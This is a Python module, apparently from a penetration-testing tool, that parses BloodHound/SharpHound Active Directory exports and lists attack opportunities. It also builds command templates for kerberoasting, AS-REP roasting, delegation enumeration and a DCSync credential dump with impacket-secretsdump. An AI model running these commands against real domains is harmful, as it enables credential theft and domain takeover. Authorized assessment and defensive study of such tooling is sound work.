"""
BloodHound / SharpHound collection parser + quick-win analysis.

Pure-Python — no Neo4j. Accepts a SharpHound .zip (multiple JSON members) or a
single BloodHound JSON file, normalizes it into a node/edge graph, and computes
common AD attack opportunities (kerberoasting, AS-REP roasting, unconstrained
delegation, high-value principals).

SharpHound/BloodHound JSON shape (v4/v5 / CE):
    { "data": [ {"Properties": {...}, "ObjectIdentifier": "...", ...}, ... ],
      "meta": {"type": "users"|"computers"|"groups"|..., "count": N} }
Older/alt collectors nest objects under a type-named key instead of "data".
"""

import io
import json
import logging
import zipfile

log = logging.getLogger(__name__)

_OBJECT_TYPES = ("users", "computers", "groups", "domains", "ous", "gpos", "containers")


def _members(obj: dict) -> list[dict]:
    """Return the list of records in a parsed SharpHound file, however it's keyed."""
    if isinstance(obj.get("data"), list):
        return obj["data"]
    for t in _OBJECT_TYPES:
        if isinstance(obj.get(t), list):
            return obj[t]
    return []


def _detect_type(filename: str, obj: dict) -> str:
    meta_type = (obj.get("meta") or {}).get("type", "")
    if meta_type:
        return meta_type.lower()
    name = filename.lower()
    for t in _OBJECT_TYPES:
        if t in name:
            return t
    return "unknown"


def _iter_json_documents(raw: bytes, filename: str):
    """Yield (member_name, parsed_json) for a zip or a single JSON upload."""
    if zipfile.is_zipfile(io.BytesIO(raw)):
        with zipfile.ZipFile(io.BytesIO(raw)) as zf:
            for member in zf.namelist():
                if not member.lower().endswith(".json"):
                    continue
                try:
                    yield member, json.loads(zf.read(member))
                except (json.JSONDecodeError, UnicodeDecodeError) as exc:
                    log.warning("Skipping unparseable AD member %s: %s", member, exc)
    else:
        try:
            yield filename, json.loads(raw)
        except (json.JSONDecodeError, UnicodeDecodeError) as exc:
            raise ValueError(f"Not a valid SharpHound zip or JSON file: {exc}")


def _prop(record: dict, key: str, default=None):
    """Case-insensitive lookup inside a record's Properties (or top level)."""
    props = record.get("Properties") or record.get("properties") or {}
    if key in props:
        return props[key]
    # case-insensitive fallback
    lk = key.lower()
    for k, v in props.items():
        if k.lower() == lk:
            return v
    return record.get(key, default)


def parse_collection(raw: bytes, filename: str) -> dict:
    """Parse a collection into {domain, stats, nodes, edges, quick_wins}."""
    nodes: list[dict] = []
    edges: list[dict] = []
    stats: dict[str, int] = {}
    domain = ""

    kerberoastable: list[str] = []
    asrep: list[str] = []
    unconstrained: list[str] = []
    high_value: list[str] = []

    for member, obj in _iter_json_documents(raw, filename):
        otype = _detect_type(member, obj)
        records = _members(obj)
        if records:
            stats[otype] = stats.get(otype, 0) + len(records)

        for rec in records:
            name = _prop(rec, "name") or _prop(rec, "samaccountname") or ""
            if not name:
                continue
            oid = rec.get("ObjectIdentifier") or rec.get("objectid") or name
            if not domain:
                dom = _prop(rec, "domain")
                if dom:
                    domain = str(dom)

            flags: list[str] = []

            if otype == "users":
                if _prop(rec, "hasspn") or _prop(rec, "serviceprincipalnames"):
                    flags.append("kerberoastable")
                    kerberoastable.append(name)
                if _prop(rec, "dontreqpreauth"):
                    flags.append("asrep")
                    asrep.append(name)
                if _prop(rec, "unconstraineddelegation"):
                    flags.append("unconstrained")
                    unconstrained.append(name)
                if _prop(rec, "admincount"):
                    flags.append("high-value")
                    high_value.append(name)
            elif otype == "computers":
                if _prop(rec, "unconstraineddelegation"):
                    flags.append("unconstrained")
                    unconstrained.append(name)
            elif otype == "groups":
                upper = name.upper()
                if any(g in upper for g in ("DOMAIN ADMINS", "ENTERPRISE ADMINS", "ADMINISTRATORS")):
                    flags.append("high-value")
                    high_value.append(name)
                # Membership edges
                for m in (rec.get("Members") or rec.get("members") or []):
                    mid = m.get("ObjectIdentifier") if isinstance(m, dict) else m
                    if mid:
                        edges.append({"source": mid, "target": oid, "kind": "MemberOf"})

            nodes.append({
                "id": oid,
                "label": name,
                "type": otype.rstrip("s") if otype != "unknown" else "object",
                "flags": flags,
            })

    quick_wins = _build_quick_wins(domain, kerberoastable, asrep, unconstrained, high_value)
    return {
        "domain": domain,
        "stats": stats,
        "nodes": nodes,
        "edges": edges,
        "quick_wins": quick_wins,
    }


def _build_quick_wins(domain, kerberoastable, asrep, unconstrained, high_value) -> list[dict]:
    dom = domain or "<domain>"
    wins = []
    if kerberoastable:
        wins.append({
            "kind": "kerberoast",
            "title": "Kerberoastable accounts",
            "severity": "high",
            "description": "Service accounts with an SPN whose TGS can be requested and cracked offline.",
            "count": len(kerberoastable),
            "items": sorted(set(kerberoastable))[:50],
            "command": f"impacket-GetUserSPNs {dom}/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerb.hashes",
        })
    if asrep:
        wins.append({
            "kind": "asrep",
            "title": "AS-REP roastable accounts",
            "severity": "high",
            "description": "Accounts with Kerberos pre-auth disabled — AS-REP hashes can be requested without creds.",
            "count": len(asrep),
            "items": sorted(set(asrep))[:50],
            "command": f"impacket-GetNPUsers {dom}/ -usersfile asrep_users.txt -no-pass -dc-ip <DC_IP> -format hashcat",
        })
    if unconstrained:
        wins.append({
            "kind": "unconstrained",
            "title": "Unconstrained delegation",
            "severity": "critical",
            "description": "Hosts/accounts trusted for unconstrained delegation — coerce a DC to capture a TGT.",
            "count": len(unconstrained),
            "items": sorted(set(unconstrained))[:50],
            "command": "nxc ldap <DC_IP> -u <user> -p <pass> --find-delegation",
        })
    if high_value:
        wins.append({
            "kind": "high_value",
            "title": "High-value principals",
            "severity": "info",
            "description": "Privileged accounts/groups (adminCount=1 or *-Admins) — primary lateral-movement objectives.",
            "count": len(high_value),
            "items": sorted(set(high_value))[:50],
            "command": "nxc ldap <DC_IP> -u <user> -p <pass> --admin-count",
        })
    return wins


# Command scaffolds for the "run this" cards — returned, never auto-executed.
ACTION_TEMPLATES = {
    "kerberoast": "impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile kerb.hashes",
    "asrep":      "impacket-GetNPUsers {domain}/ -usersfile asrep_users.txt -no-pass -dc-ip {dc_ip} -format hashcat",
    "unconstrained": "nxc ldap {dc_ip} -u {user} -p {password} --find-delegation",
    "dcsync":     "impacket-secretsdump {domain}/{user}:{password}@{dc_ip} -just-dc",
}


def scaffold_action(kind: str, **ctx) -> str:
    """Return a templated command for an AD action, filling unknowns with placeholders."""
    tmpl = ACTION_TEMPLATES.get(kind)
    if not tmpl:
        raise ValueError(f"Unknown action kind: {kind!r}")
    fields = {"domain": "<domain>", "user": "<user>", "password": "<pass>", "dc_ip": "<DC_IP>"}
    fields.update({k: v for k, v in ctx.items() if v})
    return tmpl.format(**fields)
